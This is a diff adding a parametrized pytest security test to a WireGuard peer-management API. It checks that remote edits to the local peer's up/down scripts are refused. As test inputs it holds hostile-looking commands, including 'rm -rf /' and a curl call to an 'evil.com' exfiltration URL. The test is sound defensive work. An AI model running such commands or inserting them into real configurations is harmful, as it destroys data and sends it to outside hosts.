@@ -1,5 +1,6 @@
 from tests.pytest.conftest import setup_wg_quickrs_agent
 from tests.pytest.helpers import get_this_peer_id, get_test_peer_data, get_test_connection_data, get_paths
+import pytest
 import requests
 import uuid
 from ruamel.yaml import YAML
@@ -299,4 +300,57 @@ def test_add_duplicate_connection(setup_wg_quickrs_agent):
     response = requests.patch(f"{base_url}/api/network/config", json=change_sum)
     assert response.status_code == 403
     assert "already exists" in response.content.decode("utf-8")
+
+
+@pytest.mark.parametrize(
+    "peer_id_type,script_changes,expected_status,test_description",
+    [
+        # Security vulnerability: prevent remote modification of this_peer scripts
+        ("this_peer", {"pre_up": [{"enabled": True, "script": "echo 'malicious command';"}]}, 403, "this_peer pre_up script modification forbidden"),
+        ("this_peer", {"post_up": [{"enabled": True, "script": "rm -rf /;"}]}, 403, "this_peer post_up script modification forbidden"),
+        ("this_peer", {"pre_down": [{"enabled": True, "script": "curl http://evil.com/exfiltrate;"}]}, 403, "this_peer pre_down script modification forbidden"),
+        ("this_peer", {"post_down": [{"enabled": True, "script": "/bin/bash -c 'malicious payload';"}]}, 403, "this_peer post_down script modification forbidden"),
+        ("this_peer", {
+            "pre_up": [{"enabled": True, "script": "echo 'malicious';"}],
+            "post_up": [{"enabled": True, "script": "echo 'malicious';"}],
+            "pre_down": [{"enabled": True, "script": "echo 'malicious';"}],
+            "post_down": [{"enabled": True, "script": "echo 'malicious';"}]
+        }, 403, "this_peer multiple scripts modification forbidden"),
+
+        # Ensure normal functionality: allow modification of other peer scripts
+        ("other_peer", {"pre_up": [{"enabled": True, "script": "echo 'allowed script change';"}]}, 200, "other peer script modification allowed"),
+    ],
+)
+def test_modify_peer_scripts_security(setup_wg_quickrs_agent, peer_id_type, script_changes, expected_status, test_description):
+    """Parameterized test for script modification security - prevents remote code execution on this_peer."""
+    base_url = setup_wg_quickrs_agent("no_auth_multi_peer")
+    pytest_folder, wg_quickrs_config_folder, wg_quickrs_config_file = get_paths()
+
+    this_peer = "0ed989c6-6dba-4e3c-8034-08adf4262d9e"
+    other_peer = "6e9a8440-f884-4b54-bfe7-b982f15e40fd"
+
+    peer_id = this_peer if peer_id_type == "this_peer" else other_peer
+
+    change_sum = {
+        "changed_fields": {
+            "peers": {
+                peer_id: {
+                    "scripts": script_changes
+                }
+            }
+        }
+    }
+
+    response = requests.patch(f"{base_url}/api/network/config", json=change_sum)
+    assert response.status_code == expected_status
+
+    if expected_status == 403:
+        assert "cannot modify scripts for this peer remotely" in response.content.decode("utf-8")
+    elif expected_status == 200 and peer_id_type == "other_peer":
+        # Verify the script was actually updated for other peer
+        with open(wg_quickrs_config_file) as stream:
+            new_conf = yaml.load(stream)
+
+        for script_type, script_value in script_changes.items():
+            assert new_conf["network"]["peers"][peer_id]["scripts"][script_type] == script_value
 
